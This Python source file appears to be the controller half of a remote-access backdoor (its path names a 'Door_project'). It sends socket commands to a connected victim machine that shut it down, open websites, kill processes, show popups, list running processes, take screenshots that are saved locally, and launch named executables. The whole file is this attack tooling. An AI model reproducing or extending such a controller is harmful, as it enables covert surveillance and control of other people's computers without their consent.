from time import sleep
import socket as ss


def desligar(objj):
    try:
        print("Enviando comando!")
        print("-=" * 30)
        objj.send(bytes("desligar", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return True

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def sit(objj):
    abc = (input("Nome do site ---> "))
    try:
        print("Enviando...")
        objj.send(bytes(f"site\n{abc}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return True

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def kill(objj, processo):
    try:
        objj.send(bytes(f"kill\n{processo}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return True

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def popup(objj, menssagem):
    try:
        objj.send(bytes(f"popup\n{menssagem}", "utf8"))

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def process(objj, name):
    try:
        objj.send(bytes(f"RP", "utf8"))
        with open(f"processos_{name}", 'w+') as txt:
            txt.write(f"Cliente {name} process\n")
            txt.write(f"{'-='*30}\n\n")
            while True:
                dab = objj.recv(1024)
                if dab:
                    proc = dab.decode("utf-8").split(",")
                    for a in proc:
                        txt.write(a)
                    txt.close()
                    return True

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def printt(objj):
    try:
        print("Enviando comando!")
        objj.send(bytes(f"PrintS", "utf8"))
        nome = input('nome do print ---> ')
        with open('C:\\Users\\drrod\\Desktop\\all\\Creative in Python\\PyPy\\apps py\\Door_project\\Pictures\\' + nome + '.png', 'wb') as foto:
                try:
                    while True:
                        dab = objj.recv(1000000)
                        if not dab:
                            return True
                        foto.write(dab)
                except Exception:
                    sleep(1.5)
                    return "PhotoError"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"


def expecifico(objj):
    processo = (input("Comando do Cmd ---> ") + ".exe")
    try:
        print("Enviando comando!")
        objj.send(bytes(f"expecifico\n{processo}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return True

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection"
    except ss.error:
        sleep(1.5)
        return "Conection"
    except Exception:
        sleep(1.5)
        return "Error"



